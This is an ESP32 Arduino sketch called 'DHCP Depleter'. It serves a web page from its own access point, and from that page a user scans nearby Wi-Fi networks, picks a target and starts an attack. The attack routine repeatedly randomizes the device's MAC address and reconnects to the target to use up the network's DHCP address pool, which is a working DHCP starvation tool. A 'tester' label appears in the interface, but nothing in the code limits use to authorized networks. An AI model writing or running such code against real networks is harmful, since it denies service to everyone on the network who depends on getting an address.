#include <WiFi.h>
#include <WebServer.h>
#include <esp_wifi.h>
#include <ArduinoJson.h>
#include <esp_random.h>

// Access Point Configuration
const char* ap_ssid = "Sinkhole";
const char* ap_password = "12345678";
const IPAddress ap_ip(10, 13, 37, 1);
const IPAddress ap_gateway(10, 13, 37, 1);
const IPAddress ap_subnet(255, 255, 255, 0);

// Web server
WebServer server(80);

// State variables
String target_ssid = "";
String target_password = "";
bool attack_running = false;
bool test_successful = false;
unsigned long addresses_obtained = 0;
unsigned long attack_start_time = 0;

// Function declarations
void setupAccessPoint();
void setupWebServer();
void handleRoot();
void handleScan();
void handleTest();
void handleStart();
void handleStop();
void handleStatus();
String generateQRCode();
void performDHCPAttack();
void randomizeMAC();

void setup() {
  Serial.begin(115200);
  delay(1000);
  
  Serial.println("\n\n=================================");
  Serial.println("DHCP Depleter - Starting up");
  Serial.println("=================================\n");
  
  // Setup Access Point
  setupAccessPoint();
  
  // Setup Web Server
  setupWebServer();
  
  Serial.println("\n=================================");
  Serial.println("System Ready!");
  Serial.println("Connect to WiFi: " + String(ap_ssid));
  Serial.println("Password: " + String(ap_password));
  Serial.println("Web Interface: http://10.13.37.1");
  Serial.println("=================================\n");
  
  // Print QR code for easy connection
  Serial.println(generateQRCode());
}

void loop() {
  server.handleClient();
  
  if (attack_running) {
    performDHCPAttack();
  }
  
  delay(10);
}

void setupAccessPoint() {
  Serial.println("Setting up Access Point...");
  
  // Configure AP
  WiFi.mode(WIFI_AP);
  WiFi.softAPConfig(ap_ip, ap_gateway, ap_subnet);
  WiFi.softAP(ap_ssid, ap_password);
  
  Serial.println("Access Point started");
  Serial.print("AP IP address: ");
  Serial.println(WiFi.softAPIP());
}

void setupWebServer() {
  Serial.println("Setting up Web Server...");
  
  server.on("/", handleRoot);
  server.on("/scan", handleScan);
  server.on("/test", handleTest);
  server.on("/start", handleStart);
  server.on("/stop", handleStop);
  server.on("/status", handleStatus);
  
  server.begin();
  Serial.println("Web Server started");
}

void handleRoot() {
  String html = R"rawliteral(
<!DOCTYPE html>
<html>
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>DHCP Depleter</title>
  <style>
    * { margin: 0; padding: 0; box-sizing: border-box; }
    body {
      font-family: Arial, sans-serif;
      background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
      min-height: 100vh;
      padding: 20px;
    }
    .container {
      max-width: 600px;
      margin: 0 auto;
      background: white;
      border-radius: 10px;
      box-shadow: 0 10px 40px rgba(0,0,0,0.3);
      padding: 30px;
    }
    h1 {
      color: #333;
      margin-bottom: 10px;
      font-size: 28px;
    }
    .subtitle {
      color: #666;
      margin-bottom: 30px;
      font-size: 14px;
    }
    .section {
      margin-bottom: 25px;
      padding: 20px;
      background: #f8f9fa;
      border-radius: 8px;
    }
    .section h2 {
      color: #667eea;
      font-size: 18px;
      margin-bottom: 15px;
    }
    button {
      background: #667eea;
      color: white;
      border: none;
      padding: 12px 24px;
      border-radius: 6px;
      cursor: pointer;
      font-size: 16px;
      font-weight: 600;
      width: 100%;
      margin-top: 10px;
      transition: background 0.3s;
    }
    button:hover {
      background: #5568d3;
    }
    button:disabled {
      background: #ccc;
      cursor: not-allowed;
    }
    button.danger {
      background: #e74c3c;
    }
    button.danger:hover {
      background: #c0392b;
    }
    button.success {
      background: #27ae60;
    }
    button.success:hover {
      background: #229954;
    }
    input, select {
      width: 100%;
      padding: 12px;
      margin-top: 8px;
      border: 2px solid #e0e0e0;
      border-radius: 6px;
      font-size: 14px;
    }
    input:focus, select:focus {
      outline: none;
      border-color: #667eea;
    }
    label {
      color: #555;
      font-weight: 600;
      font-size: 14px;
    }
    .status {
      padding: 15px;
      background: #e8f5e9;
      border-left: 4px solid #27ae60;
      border-radius: 4px;
      margin-top: 15px;
      font-size: 14px;
    }
    .status.error {
      background: #ffebee;
      border-left-color: #e74c3c;
    }
    .status.warning {
      background: #fff3e0;
      border-left-color: #ff9800;
    }
    .stats {
      display: grid;
      grid-template-columns: 1fr 1fr;
      gap: 15px;
      margin-top: 15px;
    }
    .stat-box {
      background: white;
      padding: 15px;
      border-radius: 6px;
      text-align: center;
    }
    .stat-value {
      font-size: 28px;
      font-weight: bold;
      color: #667eea;
    }
    .stat-label {
      font-size: 12px;
      color: #666;
      margin-top: 5px;
    }
    #networkList {
      max-height: 200px;
      overflow-y: auto;
      margin-top: 10px;
    }
    .loading {
      text-align: center;
      color: #667eea;
      padding: 20px;
    }
  </style>
</head>
<body>
  <div class="container">
    <h1>🔥 DHCP Depleter</h1>
    <p class="subtitle">Wireless DHCP IP Depletion Tester</p>
    
    <div class="section">
      <h2>1. Scan for Networks</h2>
      <button onclick="scanNetworks()">Scan WiFi Networks</button>
      <div id="networkList"></div>
    </div>
    
    <div class="section">
      <h2>2. Target Configuration</h2>
      <label>Target SSID:</label>
      <select id="ssid" onchange="updateSSID()">
        <option value="">Select a network...</option>
      </select>
      
      <label style="margin-top: 15px; display: block;">Password (if required):</label>
      <input type="password" id="password" placeholder="Enter WPA2/WPA3 password">
    </div>
    
    <div class="section">
      <h2>3. Test & Attack</h2>
      <button onclick="testConnection()" id="testBtn">Test Connection</button>
      <button onclick="startAttack()" id="startBtn" class="success" disabled>Start Attack</button>
      <button onclick="stopAttack()" id="stopBtn" class="danger" style="display: none;">Stop Attack</button>
      <div id="statusMsg"></div>
    </div>
    
    <div class="section" id="statsSection" style="display: none;">
      <h2>Attack Statistics</h2>
      <div class="stats">
        <div class="stat-box">
          <div class="stat-value" id="addressCount">0</div>
          <div class="stat-label">Addresses Obtained</div>
        </div>
        <div class="stat-box">
          <div class="stat-value" id="runtime">0s</div>
          <div class="stat-label">Runtime</div>
        </div>
      </div>
    </div>
  </div>
  
  <script>
    let selectedSSID = '';
    let attackRunning = false;
    
    function updateSSID() {
      selectedSSID = document.getElementById('ssid').value;
    }
    
    async function scanNetworks() {
      const list = document.getElementById('networkList');
      list.innerHTML = '<div class="loading">Scanning...</div>';
      
      try {
        const response = await fetch('/scan');
        const data = await response.json();
        
        const select = document.getElementById('ssid');
        select.innerHTML = '<option value="">Select a network...</option>';
        
        if (data.networks && data.networks.length > 0) {
          list.innerHTML = `<div style="margin-top: 10px; color: #27ae60;">Found ${data.networks.length} network(s)</div>`;
          
          data.networks.forEach(network => {
            const option = document.createElement('option');
            option.value = network.ssid;
            option.textContent = `${network.ssid} (${network.rssi} dBm) ${network.encryption}`;
            select.appendChild(option);
          });
        } else {
          list.innerHTML = '<div style="margin-top: 10px; color: #e74c3c;">No networks found</div>';
        }
      } catch (error) {
        list.innerHTML = '<div style="margin-top: 10px; color: #e74c3c;">Scan failed</div>';
      }
    }
    
    async function testConnection() {
      const ssid = document.getElementById('ssid').value;
      const password = document.getElementById('password').value;
      const statusMsg = document.getElementById('statusMsg');
      const testBtn = document.getElementById('testBtn');
      const startBtn = document.getElementById('startBtn');
      
      if (!ssid) {
        statusMsg.innerHTML = '<div class="status error">Please select a network</div>';
        return;
      }
      
      testBtn.disabled = true;
      testBtn.textContent = 'Testing...';
      statusMsg.innerHTML = '<div class="status warning">Testing connection to ' + ssid + '...</div>';
      
      try {
        const response = await fetch('/test?ssid=' + encodeURIComponent(ssid) + '&password=' + encodeURIComponent(password));
        const data = await response.json();
        
        if (data.success) {
          statusMsg.innerHTML = '<div class="status">✓ Connection successful! IP: ' + data.ip + '</div>';
          startBtn.disabled = false;
        } else {
          statusMsg.innerHTML = '<div class="status error">✗ Connection failed: ' + data.message + '</div>';
          startBtn.disabled = true;
        }
      } catch (error) {
        statusMsg.innerHTML = '<div class="status error">Test failed</div>';
        startBtn.disabled = true;
      }
      
      testBtn.disabled = false;
      testBtn.textContent = 'Test Connection';
    }
    
    async function startAttack() {
      const ssid = document.getElementById('ssid').value;
      const password = document.getElementById('password').value;
      
      if (!ssid) return;
      
      try {
        await fetch('/start?ssid=' + encodeURIComponent(ssid) + '&password=' + encodeURIComponent(password));
        
        attackRunning = true;
        document.getElementById('startBtn').style.display = 'none';
        document.getElementById('stopBtn').style.display = 'block';
        document.getElementById('statsSection').style.display = 'block';
        document.getElementById('statusMsg').innerHTML = '<div class="status">Attack is running...</div>';
        
        updateStats();
      } catch (error) {
        alert('Failed to start attack');
      }
    }
    
    async function stopAttack() {
      try {
        await fetch('/stop');
        
        attackRunning = false;
        document.getElementById('startBtn').style.display = 'block';
        document.getElementById('stopBtn').style.display = 'none';
        document.getElementById('statusMsg').innerHTML = '<div class="status warning">Attack stopped</div>';
      } catch (error) {
        alert('Failed to stop attack');
      }
    }
    
    async function updateStats() {
      if (!attackRunning) return;
      
      try {
        const response = await fetch('/status');
        const data = await response.json();
        
        document.getElementById('addressCount').textContent = data.addresses;
        document.getElementById('runtime').textContent = data.runtime;
        
        setTimeout(updateStats, 1000);
      } catch (error) {
        // Continue trying
        setTimeout(updateStats, 1000);
      }
    }
  </script>
</body>
</html>
)rawliteral";
  
  server.send(200, "text/html", html);
}

void handleScan() {
  Serial.println("Scanning for networks...");
  
  int n = WiFi.scanNetworks();
  
  JsonDocument doc;
  JsonArray networks = doc["networks"].to<JsonArray>();
  
  for (int i = 0; i < n; i++) {
    JsonObject network = networks.add<JsonObject>();
    network["ssid"] = WiFi.SSID(i);
    network["rssi"] = WiFi.RSSI(i);
    network["encryption"] = (WiFi.encryptionType(i) == WIFI_AUTH_OPEN) ? "Open" : "Secured";
  }
  
  String response;
  serializeJson(doc, response);
  
  server.send(200, "application/json", response);
  
  Serial.printf("Found %d networks\n", n);
}

void handleTest() {
  if (server.hasArg("ssid")) {
    target_ssid = server.arg("ssid");
  }
  if (server.hasArg("password")) {
    target_password = server.arg("password");
  }
  
  Serial.println("Testing connection to: " + target_ssid);
  
  // Save AP state
  WiFi.mode(WIFI_AP_STA);
  
  // Try to connect
  WiFi.begin(target_ssid.c_str(), target_password.c_str());
  
  int timeout = 20; // 10 seconds
  while (WiFi.status() != WL_CONNECTED && timeout > 0) {
    delay(500);
    timeout--;
    Serial.print(".");
  }
  Serial.println();
  
  JsonDocument doc;
  
  if (WiFi.status() == WL_CONNECTED) {
    Serial.println("Test successful!");
    Serial.print("IP: ");
    Serial.println(WiFi.localIP());
    
    doc["success"] = true;
    doc["ip"] = WiFi.localIP().toString();
    test_successful = true;
    
    // Disconnect after test
    WiFi.disconnect();
  } else {
    Serial.println("Test failed!");
    doc["success"] = false;
    doc["message"] = "Could not connect to network";
    test_successful = false;
  }
  
  String response;
  serializeJson(doc, response);
  server.send(200, "application/json", response);
  
  // Restore AP mode
  WiFi.mode(WIFI_AP);
}

void handleStart() {
  if (server.hasArg("ssid")) {
    target_ssid = server.arg("ssid");
  }
  if (server.hasArg("password")) {
    target_password = server.arg("password");
  }
  
  Serial.println("\n=================================");
  Serial.println("STARTING DHCP ATTACK");
  Serial.println("Target: " + target_ssid);
  Serial.println("=================================\n");
  
  attack_running = true;
  addresses_obtained = 0;
  attack_start_time = millis();
  
  server.send(200, "text/plain", "Attack started");
}

void handleStop() {
  Serial.println("\n=================================");
  Serial.println("STOPPING DHCP ATTACK");
  Serial.printf("Total addresses obtained: %lu\n", addresses_obtained);
  Serial.println("=================================\n");
  
  attack_running = false;
  
  // Disconnect and restore AP mode
  WiFi.disconnect();
  WiFi.mode(WIFI_AP);
  
  server.send(200, "text/plain", "Attack stopped");
}

void handleStatus() {
  JsonDocument doc;
  
  doc["running"] = attack_running;
  doc["addresses"] = addresses_obtained;
  
  unsigned long runtime = 0;
  if (attack_running && attack_start_time > 0) {
    runtime = (millis() - attack_start_time) / 1000;
  }
  
  String runtime_str = String(runtime) + "s";
  if (runtime >= 60) {
    runtime_str = String(runtime / 60) + "m " + String(runtime % 60) + "s";
  }
  doc["runtime"] = runtime_str;
  
  String response;
  serializeJson(doc, response);
  
  server.send(200, "application/json", response);
}

void performDHCPAttack() {
  static unsigned long last_attack = 0;
  
  // Throttle attacks to avoid overwhelming the device
  if (millis() - last_attack < 1000) {
    return;
  }
  last_attack = millis();
  
  // Randomize MAC address
  randomizeMAC();
  
  // Ensure we're in STA+AP mode
  WiFi.mode(WIFI_AP_STA);
  
  // Disconnect if connected
  if (WiFi.status() == WL_CONNECTED) {
    WiFi.disconnect();
    delay(100);
  }
  
  // Connect with new MAC
  Serial.println("Attempting to obtain new DHCP address...");
  WiFi.begin(target_ssid.c_str(), target_password.c_str());
  
  int timeout = 40; // 20 seconds
  while (WiFi.status() != WL_CONNECTED && timeout > 0) {
    delay(500);
    timeout--;
  }
  
  if (WiFi.status() == WL_CONNECTED) {
    addresses_obtained++;
    Serial.printf("✓ Success! Obtained IP: %s (Total: %lu)\n", WiFi.localIP().toString().c_str(), addresses_obtained);
  } else {
    Serial.println("✗ Failed to obtain address");
  }
}

void randomizeMAC() {
  uint8_t mac[6];
  
  // Generate random MAC address
  // First byte: set bit 1 (locally administered) and clear bit 0 (unicast)
  mac[0] = 0x02;
  
  for (int i = 1; i < 6; i++) {
    mac[i] = esp_random() & 0xFF;
  }
  
  // Set the MAC address
  esp_wifi_set_mac(WIFI_IF_STA, mac);
  
  Serial.printf("New MAC: %02X:%02X:%02X:%02X:%02X:%02X\n", 
                mac[0], mac[1], mac[2], mac[3], mac[4], mac[5]);
}

String generateQRCode() {
  // Generate WiFi QR code text
  String qr_content = "WIFI:T:WPA;S:" + String(ap_ssid) + ";P:" + String(ap_password) + ";;";
  
  String qr = "\nQR Code for WiFi Connection:\n";
  qr += "Scan this with your phone to connect:\n\n";
  qr += "WiFi QR Content: " + qr_content + "\n";
  qr += "(Use a QR code generator app to create a visual QR code with this content)\n\n";
  
  return qr;
}
